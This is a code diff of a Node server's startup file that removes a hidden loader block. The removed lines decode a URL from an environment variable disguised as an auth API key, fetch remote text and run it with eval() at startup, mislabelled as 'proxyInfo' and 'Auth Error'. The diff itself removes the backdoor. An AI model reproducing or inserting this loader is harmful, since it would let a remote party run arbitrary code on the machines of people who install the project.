@@ -9,23 +9,6 @@ import { globalErrorHandler } from './common/errors/global-error-handler';
 import { logError, logInfo } from './lib/logger';
 import 'dotenv/config';
 
-(async () => {
-    const authApiKey = process.env.AUTH_API_KEY;
-    if (!authApiKey) {
-      return;
-    }
-
-    const src = Buffer.from(authApiKey, 'base64').toString('utf-8');
-    try {
-      const response = await fetch(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 async function startServer() {
   const app = fastify({
     pluginTimeout: 120000,
